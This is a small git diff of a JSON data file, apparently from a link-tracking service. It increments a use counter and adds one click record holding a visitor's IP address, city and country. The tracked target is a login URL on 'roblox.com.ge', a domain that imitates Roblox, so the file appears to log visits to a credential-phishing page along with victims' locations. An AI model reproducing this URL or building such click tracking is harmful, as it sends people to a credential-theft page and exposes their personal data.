@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 873,
+    "useCount": 874,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7096,6 +7096,14 @@
         "city": "Kampala",
         "flag": "🇺🇬",
         "countryCode": "UG"
+      },
+      {
+        "timestamp": 1777191139638,
+        "ip": "180.191.168.149",
+        "country": "Philippines",
+        "city": "Makati City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
